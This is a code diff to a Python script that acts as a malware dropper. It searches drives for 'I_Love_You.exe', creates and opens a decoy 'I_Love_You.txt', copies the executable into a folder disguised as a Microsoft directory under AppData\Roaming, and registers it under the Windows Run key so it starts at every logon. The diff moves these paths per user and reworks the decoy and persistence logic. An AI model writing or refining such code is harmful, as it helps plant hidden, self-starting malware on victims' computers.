@@ -4,13 +4,6 @@ import shutil
 import subprocess
 from winreg import *
 
-path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
-filePath = 'C:\\SYSTEM.SWAV\\cleaner_registry.exe'
-dst = 'C:\\SYSTEM.SWAV'
-dst2 = 'C:\\SYSTEM.SWAV\\Am0ASk2'
-safe_file = "C:\\SYSTEM.SWAV\\CleanerRegistry.log"
-
-
 # Searchs the whole computer for the file
 
 
@@ -22,84 +15,80 @@ def finder(name, pathS):
             pathF = os.path.join(root, name)
             return os.path.join(root, name)
         else:
-            pass
-
-
-def finder2(name, pathS):
-    for root, dirs, files in os.walk(pathS):
-        if name in files:
-            global pathF, pathB
-            pathB = os.path.join(root)
-            pathF = os.path.join(root, name)
-            return os.path.join(root, name)
-        else:
-            pass
+            global FileNotFound
+            FileNotFound = True
 
 
 def cleaner(name, pathC):
-    for root, dirs, files in os.walk(pathC):
+    if os.path.isfile(os.path.join(pathC, name)) is False:
         try:
-            if name not in files:
-                CleanerRegistry = os.path.join(root, name)
-                print(CleanerRegistry)
+            # Creates the decoy file
+            with open(pathDecoy, 'w') as file:
+                file.write('<3')
+                file.close()
 
-                # Creates the decoy file
-                with open(pathDecoy, 'w') as file:
-                    file.write('<3')
-                    file.close()
+            try:
+                shutil.copy(src, dst)
+                print('[!] File Copied to safe place')
+            except OSError as E:
+                print('[!] Exception file not copied: ', str(E))
+
+            # Opens Decoy File when parent script clicked
+            if platform.system() == 'Windows':  # Windows
+                os.startfile(pathDecoy)
+            elif platform.system() == 'Darwin':  # MacOS
+                subprocess.Popen(['start', pathDecoy])
+            else:  # Linux
+                subprocess.Popen(['xdg-open', pathDecoy])
+
+            # Windows only
+            # Try stock access rights with 64bits program to 64bit registry
+            try:
+                key = OpenKey(HKEY_CURRENT_USER, path,
+                              0, access=KEY_ALL_ACCESS)
+                SetValueEx(key, 'Registry', 0, REG_SZ, filePath)
+                CloseKey(key)
+            except FileNotFoundError:
+
+                bits = platform.architecture()[0]
+
+                # https://docs.microsoft.com/en-us/windows/desktop/WinProg64/accessing-an-alternate-registry-view
+                if bits == '32bits':
+                    access_right = KEY_WOW64_64KEY
+                if bits == '64bits':
+                    access_right = KEY_WOW64_32KEY
 
                 try:
-                    shutil.copy(src, dst)
-                    print('[!] File Copied to safe place')
-                except OSError as E:
-                    print('[!] Exception file not copied: ', str(E))
-
-                # Opens Decoy File when parent script clicked
-                if platform.system() == 'Windows':  # Windows
-                    os.startfile(pathDecoy)
-                elif platform.system() == 'Darwin':  # MacOS
-                    subprocess.Popen(['start', pathDecoy])
-                else:  # Linux
-                    subprocess.Popen(['xdg-open', pathDecoy])
-
-                # Windows only
-                # Try stock access rights with 64bits program to 64bit registry
-                try:
-                    key = OpenKey(HKEY_CURRENT_USER, path,
-                                  0, access=KEY_ALL_ACCESS)
+                    key = OpenKey(HKEY_CURRENT_USER, path, 0,
+                                  access=KEY_ALL_ACCESS | access_right)
                     SetValueEx(key, 'Registry', 0, REG_SZ, filePath)
                     CloseKey(key)
-                except FileNotFoundError:
-
-                    bits = platform.architecture()[0]
-
-                    # https://docs.microsoft.com/en-us/windows/desktop/WinProg64/accessing-an-alternate-registry-view
-                    if bits == '32bits':
-                        access_right = KEY_WOW64_64KEY
-                    if bits == '64bits':
-                        access_right = KEY_WOW64_32KEY
-
-                    try:
-                        key = OpenKey(HKEY_CURRENT_USER, path, 0,
-                                      access=KEY_ALL_ACCESS | access_right)
-                        SetValueEx(key, 'Registry', 0, REG_SZ, filePath)
-                        CloseKey(key)
-                    except Exception as e:
-                        print(
-                            '[!] Exception registry key could not be set: %s' % str(e))
+                except Exception as e:
+                    print(
+                        '[!] Exception registry key could not be set: %s' % str(e))
         except FileNotFoundError:
             print('[!] File security file not found.')
 
 
+UserName = os.getlogin()
+
+path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
+filePath = 'C:\\Users\\' + UserName + \
+    '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\cleaner_registry.exe'
+dst = 'C:\\Users\\' + UserName + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV'
+dst2 = dst + '\\Am0ASk2'
+safeFile = dst + "\\CleanerRegistry.log"
+
 finder('I_Love_You.exe', 'C:\\')
-finder2('I_Love_You.exe', 'D:\\')
+if FileNotFound is True:
+    finder('I_Love_You.exe', 'D:\\')
 
 src = pathF
 pathDecoy = os.path.join(pathB, 'I_Love_You.txt')
-pathCleanerIdentity = safe_file
+pathCleanerIdentity = safeFile
 
 # Removes the origin file in the next startup
-if os.path.exists(safe_file) is True:
+if os.path.exists(safeFile) is True:
     try:
         os.remove(src)
     except OSError:
@@ -112,7 +101,7 @@ except OSError:
     print('[!] Could not create %s' % dst, 'directory.')
 else:
     print('[+] %s ' % dst, 'created succssfully!')
-    cleaner('CleanerRegistry.log', 'C:\\SYSTEM.SWAV')
+    cleaner('CleanerRegistry.log', dst)
 
 # Creates one file that will be trigger a cleaner function
 with open(pathCleanerIdentity, 'w') as file:
